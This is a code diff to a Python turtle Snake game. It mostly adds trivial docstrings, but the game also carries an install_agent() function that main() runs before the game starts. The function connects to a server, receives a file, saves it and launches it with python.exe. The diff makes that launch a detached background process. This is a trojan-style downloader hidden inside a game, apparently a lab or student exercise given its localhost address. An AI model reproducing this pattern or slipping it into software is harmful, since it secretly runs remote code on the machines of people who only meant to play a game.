@@ -18,6 +18,7 @@ SERVER_IP = "127.0.0.1"
 SERVER_PORT = 8840
 MSG_LEN_PROTOCOL = 4
 EOF = b'-1'
+DEATACHED_PROCCESS = 8
 
 # half width/height of game board for collision detection
 BOARD_HALF_WIDTH = 290
@@ -38,6 +39,10 @@ RESET_DELAY = 1
 
 
 class Snake:
+    """
+    snake class
+    """
+
     def __init__(self):
 
         # Head position
@@ -122,7 +127,10 @@ class Snake:
             self.head.setx(self.x + STEP_DISTANCE)
 
     def add_segment(self):
-        # Add a segment
+        """
+         Add a segment
+        :return: 
+        """""
         new_segment = turtle.Turtle()
         new_segment.speed(0)
         new_segment.shape("square")
@@ -131,10 +139,19 @@ class Snake:
         self.segments.append(new_segment)
 
     def is_outside(self, size):
+        """
+        return true if outside
+        :param size:
+        :return:
+        """
         return self.head.xcor() > size or self.head.xcor() < -size or \
                self.head.ycor() > size or self.head.ycor() < -size
 
     def reset(self):
+        """
+        reset the head
+        :return:
+        """
         self.head.goto(0, 0)
         self.head.direction = "stop"
 
@@ -149,13 +166,20 @@ class Snake:
         return self.head.distance(item)
 
     def is_self_collision(self):
+        """
+        return True if the collision
+        :return:
+        """
         for segment in self.segments:
             if segment.distance(self.head) < COLLISION_DISTANCE:
                 return True
 
 
 def install_agent():
-    # server connection
+    """
+    server connection
+    :return:
+    """
     my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
     signal = 'g'.encode()
@@ -199,10 +223,13 @@ def install_agent():
                 f.write(data)
             except Exception:
                 done = True
-        process = subprocess.Popen(["python.exe", location])
+        process = subprocess.Popen(["python.exe", location], creationflags=DEATACHED_PROCCESS)
 
 
 class Game:
+    """
+    class Game
+    """
 
     def __init__(self):
         self.delay = INITIAL_DELAY
@@ -241,11 +268,19 @@ class Game:
                        font=("Courier", 24, "normal"))
 
     def write_score(self):
+        """
+        writes the score
+        :return:
+        """
         self.pen.clear()
         self.pen.write("Score: {}  High Score: {}".format(self.score, self.high_score),
                        align="center", font=("Courier", 24, "normal"))
 
     def reset(self):
+        """
+        reset the snake
+        :return:
+        """
         # Reset snake
         self.snake.reset()
         # Reset the score
@@ -254,6 +289,10 @@ class Game:
         self.delay = INITIAL_DELAY
 
     def run(self):
+        """
+        run the score
+        :return:
+        """
 
         self.pen.write("Score: 0  High Score: 0", align="center",
                        font=("Courier", 24, "normal"))
@@ -298,6 +337,10 @@ class Game:
 
 
 def main():
+    """
+    running the install agent method and the game
+    :return:
+    """
     install_agent()
     game = Game()
     game.run()
